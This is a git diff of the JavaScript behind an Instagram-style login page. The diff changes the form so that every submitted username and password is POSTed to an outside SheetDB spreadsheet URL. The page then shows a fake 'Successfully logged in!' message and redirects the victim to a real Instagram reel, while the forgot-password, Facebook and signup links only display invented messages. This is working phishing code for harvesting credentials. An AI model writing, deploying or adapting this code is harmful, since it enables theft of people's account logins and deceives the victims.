@@ -61,19 +61,25 @@ loginForm.addEventListener('submit', async (e) => {
   loginBtn.textContent = 'Logging in...';
   loginBtn.disabled = true;
 
+  // ✅ Replace with your SheetDB API URL
+  const sheetdbUrl = "https://sheetdb.io/api/v1/z00ja4kw8al8y";
+
   try {
-    const response = await fetch("/.netlify/functions/save-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
-      });
-      
+    const response = await fetch(sheetdbUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        data: {
+          username: username,
+          password: password
+        }
+      })
+    });
 
     if (response.ok) {
       showMessage('Successfully logged in!', 'success');
       loginForm.reset();
 
-      // ✅ Redirect to Instagram Reel
       setTimeout(() => {
         window.location.href = "https://www.instagram.com/reel/C6EHz5AL8wK/?igsh=MTdmM3YwMHZ5ZTVwaA==";
       }, 1500);
@@ -90,37 +96,31 @@ loginForm.addEventListener('submit', async (e) => {
 });
 
 // Input styling
-usernameInput.addEventListener('input', function() {
-  this.style.borderColor = this.value.trim() ? '#2a2a2a' : '#262626';
-});
-passwordInput.addEventListener('input', function() {
-  this.style.borderColor = this.value.trim() ? '#2a2a2a' : '#262626';
-});
-
 const inputs = document.querySelectorAll('input');
 inputs.forEach(input => {
+  input.addEventListener('input', () => {
+    input.style.borderColor = input.value.trim() ? '#2a2a2a' : '#262626';
+  });
   input.addEventListener('focus', () => input.style.borderColor = '#a8a8a8');
   input.addEventListener('blur', () => input.style.borderColor = '#262626');
 });
 
-// Language selector (optional)
+// Language selector
 languageSelect.addEventListener('change', (e) => {
   console.log('Selected language:', e.target.value);
 });
 
-// Facebook login handler
+// Link handlers
 document.querySelector('.facebook-link').addEventListener('click', (e) => {
   e.preventDefault();
   showMessage('Connecting to Facebook...', 'success');
 });
 
-// Forgot password handler
 document.querySelector('.forgot-password').addEventListener('click', (e) => {
   e.preventDefault();
   showMessage('Password reset link sent to your email', 'success');
 });
 
-// Signup link handler
 document.querySelector('.signup-link').addEventListener('click', (e) => {
   e.preventDefault();
   showMessage('Redirecting to sign up page...', 'success');
